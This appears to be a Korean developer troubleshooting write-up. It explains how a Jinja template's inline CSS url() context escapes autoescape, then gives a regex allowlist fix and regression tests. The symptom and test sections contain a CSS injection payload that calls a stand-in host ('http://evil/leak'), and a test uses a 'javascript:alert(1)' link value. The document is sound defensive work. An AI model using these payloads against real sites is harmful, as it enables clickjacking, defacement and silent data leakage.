# Jinja autoescape가 켜져 있어도 인라인 CSS `url()` 컨텍스트는 못 막는 문제

- **날짜**: 2026-06-29
- **영역**: serve
- **심각도**: 높음 (스크랩 입력의 인라인 CSS 인젝션 → 클릭재킹 · 외부 리소스 페치)

## 증상

Plan 2 서빙 UI에서 카드 썸네일 · 상세 히어로가 스크랩한 `image_url`을 **인라인 CSS**에 넣는다.

```jinja
<div class="thumb" style="background-image:url('{{ a.image_url }}')"></div>
```

Jinja autoescape가 **켜져 있는데도** (`docs/troubleshooting/2026-05-27-jinja-autoescape-j2-extension.md`에서 `default=True`로 수정 완료), 악의적 `image_url`이 `url('...')`를 탈출해 임의의 인라인 스타일 선언을 주입할 수 있다.

```
입력: x'); } body{display:none} a{background:url('http://evil/leak
```

`og:image`는 외부 사이트에서 스크랩하는 값이라 통제 불가 → 공개 사이트에 그대로 노출되면 실재 위험.

## 진단 과정 (왜 이렇게 판단했는가)

1. **의심 지점**: autoescape는 켜져 있으니 "이스케이프되니 안전하겠지"가 첫 직관. 가정하지 않고 실제 렌더 출력을 확인.
2. **직접 입증**: 악성 payload를 넣고 렌더했더니 출력이 이렇게 나온다.
   ```
   url('x&#39;); } body{display:none} a{background:url(&#39;http://evil/leak')
   ```
   autoescape는 `'`를 `&#39;`로 바꿨다. 여기까지는 정상.
3. **핵심 — 브라우저의 2단계 디코딩**: 브라우저는 속성 값을 먼저 **HTML 디코딩**한 뒤 그 결과를 **CSS 파서**에 넘긴다.
   - HTML 디코딩 단계에서 `&#39;` → `'`로 **복원**됨.
   - 복원된 `'`가 CSS 파서에는 그대로 보여 `url('...')`의 닫는 따옴표로 작동 → 컨텍스트 탈출.
   - 즉 autoescape의 HTML 이스케이프는 **CSS `url()` 컨텍스트에서는 무효**.
4. **영향 범위 한정**: `"` · `<` · `>`는 여전히 이스케이프 유지 → **속성 탈출 · 태그 탈출 불가 = 스크립트 XSS 아님**.
   - 주입은 그 한 요소의 **추가 인라인 스타일 선언**으로 국한 (`} body {…}` 룰블록 부분은 인라인 스타일 파서가 버림).
   - 실질 악용 = `position:fixed;width:100vw;height:100vh;z-index`로 전체 화면 클릭재킹 오버레이 + `background:url(http://attacker)`로 조용한 외부 리소스 페치 (열람 노출 · defacement).
   - 중간 심각도.

## 원인

**autoescape는 컨텍스트 비의존 (context-blind)이다.**
HTML 본문 · 속성 값 컨텍스트에는 맞지만, 같은 속성 안의 **CSS `url()`** · JS · URL 스킴 위치는 별개 컨텍스트라 HTML 이스케이프만으로 안전해지지 않는다.
스크랩 데이터를 인라인 `style`에 직접 보간한 게 근본 원인.

같은 부류로, 출처 링크 `href="{{ a.url }}"`도 스크랩 `url`을 받으므로 `javascript:` 스킴이 들어오면 클릭 시 실행된다 (autoescape는 스킴을 막지 못함).

## 해결

표시 직전 살균을 데이터 데코레이터 (`_decorate`)에 두어, 템플릿 · 다른 함수는 무수정으로 닫는다.
DB 행이 아니라 렌더용 복사본만 손댄다.

```python
# src/bullet_in/serve/render.py — _decorate() 안, a = dict(row) 직후
iu = row.get("image_url")
a["image_url"] = iu if iu and re.match(r"^https?://[^\s'\"()]+$", iu) else None
u = row.get("url") or ""
a["url"] = u if re.match(r"^https?://", u) else "#"
```

- `image_url`: `http(s)://` + `'` · `"` · `(` · `)` · 공백을 모두 배제한 허용목록. 미일치 시 `None` → 템플릿의 `{% if a.image_url %}`가 그라데이션 플레이스홀더로 폴백 (애초에 CSS 컨텍스트에 값이 들어가지 않음).
- `url`: 비 `http(s)` 스킴 (`javascript:` · `data:` · 프로토콜 상대 `//`)이면 `#`로 치환.

회귀 테스트 (`tests/test_serve_render.py`, RED → GREEN 고정):

```python
def test_index_rejects_malicious_image_url():
    bad = "x'); } body{display:none} a{background:url('http://evil/leak"
    html = render_index([_row(image_url=bad)], SOURCES, NOW)
    assert "evil" not in html
    assert "PHOTO · 16:9" in html  # 플레이스홀더 폴백

def test_detail_rejects_javascript_origin_url():
    a = _row(url="javascript:alert(1)")
    nb = build_neighbors([a], 0, SOURCES, NOW)
    html = render_article(_decorated(a), nb, "h1", SOURCES, NOW)
    assert "javascript:alert(1)" not in html
```

## 예방

- **autoescape ≠ 만능.** 스크랩/외부 입력이 들어가는 컨텍스트별로 따로 검증:
  - HTML 본문 · 속성 값 → autoescape로 충분.
  - 인라인 CSS (`style="...url('X')"`) → **허용목록** (따옴표 · 괄호 · 공백 배제) 또는 애초에 인라인 CSS에 넣지 않음 (클래스 + 별도 자원).
  - 링크 `href` · `src` → **스킴 허용목록** (`http(s)`만), `javascript:` · `data:` 차단.
- 외부 입력을 새 컨텍스트에 넣을 때는 "autoescape가 켜져 있나"가 아니라 **"이 컨텍스트에서 무엇이 위험 문자인가"**를 먼저 묻는다.
- 단위 테스트는 정상 한국어만 검사하면 이런 결함을 못 잡는다 (이전 사례 `docs/troubleshooting/2026-05-27-jinja-autoescape-j2-extension.md`와 동일 교훈) → **악성 입력 → 출력 미포함** 단언을 둔다.

## 남은 메모 (비차단)

- `image_url` 정규식의 `$`는 파이썬 기본 모드에서 **끝 개행 1개를 허용**한다 (`"https://…/img.jpg\n"` 통과).
  `\n`은 `url()`을 닫지 못해 (따옴표 · 괄호 아님) **보안 우회는 아니고** CSS 파싱 오류로 끝나지만, 엄밀히는 `re.fullmatch(r"https?://[^\s'\"()]+", iu)`가 더 정확.
  다음 손볼 때 정리.
